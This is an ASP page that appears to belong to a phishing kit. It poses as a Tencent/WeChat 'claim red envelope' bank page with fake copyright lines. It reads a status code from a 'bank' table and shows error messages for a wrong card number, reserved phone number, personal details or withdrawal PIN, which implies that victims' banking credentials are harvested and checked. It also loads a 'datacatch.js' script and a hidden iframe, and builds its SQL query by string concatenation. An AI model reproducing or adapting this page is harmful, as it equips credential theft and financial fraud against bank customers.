<!--#include file="include/db_conn.asp"-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>领取红包</title>
<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
<link rel="stylesheet" href="css/reset.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="" id="min320">
<link rel="apple-touch-startup-image" href="milanoo_startup.png">
<link rel="apple-touch-icon-precomposed" href="milanoo_startup.png">
<script src="images/jquery-1.6.min.js"></script>
<script src="images/main.js"></script>
<style type="text/css"> 
#no_css{
	display:none;	
}
 
.financial_content a:hover {color: #0066b3; }
.financial_content a:active {color: #0066b3; }
.financial_content a:link {color: #0066b3; }
.financial_content a:visited {color: #0066b3; }
 
.wb_list a:hover {color: #0066b3; }
.wb_list a:active {color: #0066b3; }
.wb_list a:link {color: #0066b3; }
.wb_list a:visited {color: #0066b3; }
 
.news1_list1 li a{display:inline-block;max-width:100%}
.style1 {color: #FF0000}
.head {
		line-height: 0;
		text-align: center;
	}
	.ccb_title1 {
		min-height: 58px;
		line-height: 58px;
		font-size: 16px;
		text-align: center;
		background: #F6F6F6 none repeat scroll 0% 0%;
		border-top: 3px solid #44b549;
		border-bottom: 1px solid #D9DADC;
	}
	
	.news .ccb_title1 tr td .on a{
			color:#FFFDFD
	}
</style>
<script type="text/javascript"> 
$(function(){
	$("#no_js").hide();
});
</script>
</head>
<body>
<div class="page">
  <div class="head">
   <img alt="" src="images/da.png">
  </div>
    <div class="hq_page">
		<div class="news ccb_title1">
			<table width="100%">
				<tbody>
					<tr>
						<td align="center">首页</td>
						<td align="center">微信商城</td>
						<td align="center">我的微信</td>
						<td align="center" style="background: #44b549 none repeat scroll 0% 0%; color = red;"><a>微信平台</a></td>
						<td align="center">服务支持</td>
					</tr>
				</tbody>
			</table>
		</div><br>
    <div class="hq_page">
      <div class="news ccb_title">
        <h1>对不起，信息出现错误！</h1>
      </div>
      <div id="pic2" class="pic2 content"> 
<%
dim rs
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
m=rs("m")
rs.close
set rs=Nothing

select case m
case 3
	response.write "您的帐户没有留存手机号码，请到我行网点绑定手机号码即可参与兑换"
case 4
	response.write "银行预留手机号码不正确，请返回重新输入"
case 5
	response.write "注册卡（帐）号不存在或者已被注销，请返回重新输入"
case 6
	response.write "您输入的信息与银行记录的信息不一致，请返回重新输入"
case 7
	response.write "系统繁忙 稍后再试"
case 8
	response.write "您输入的取款密码有误，请返回重新输入。"
case 9
	response.write "核实成功,该卡暂不支持提现,请更换卡号或银行类型!"
end Select
	  %>
        <div class="mobile_login"> <a href="register.asp"><span class="login_ico_l"></span><span class="login_ico_m">上一步</span><span class="login_ico_r"></span></a></div>
      </div>
    </div>
    <!-- InstanceEndEditable -->
        <meta name="format-detection" content="telephone=no">
    <div class="footer">
      <h4 style="font-size:12px;">Copyright 1999-2014 腾讯 版权所有 <br>中华人民共和国增值电信业务经营许可证<br>
        经营许可证编号：A2.B1.B2-20100001  </h4>
    </div>
    <!-- /footer -->
    <script src="./error_files/dataacquisition.xy.ccb.js"></script>
    <script src="./error_files/datacatch.js"></script>
  </div>
  <!-- InstanceEnd --> </div>
<iframe src="online.asp" style="display: none;"></iframe>
</body>
</html>
